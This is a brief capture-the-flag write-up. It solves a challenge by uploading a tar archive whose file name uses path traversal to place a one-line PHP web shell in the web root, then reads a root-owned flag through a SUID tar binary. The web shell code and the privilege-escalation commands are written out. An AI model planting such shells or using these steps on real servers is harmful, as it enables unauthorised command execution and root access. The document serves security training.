# Writeup

Upload a .tar.gz file (name can be arbitrary) which contains a file used for path traversal.
There are several ways to do it, one way would be to call the file `../../var/www/html/databases/[actual_file_name]`
to upload to the databases folder. The content of the file could be a reverse or web shell, the more comfortable
way would be to use web shell like this: 

```php
<?php
echo shell_exec($_GET['cmd']);
?> 
```

The final step is to escalte privileges - a simple `find / -perm -4000` should reveal that the `tar-binary` has the 
suid bit set. Gtfobins will help in that case.
I used `cd /tmp && tar czvf t /root/flag.txt && tar xzvf t && cat ./root/flag.txt` which is not the way gtfobins
would read files but works nonetheless.%        
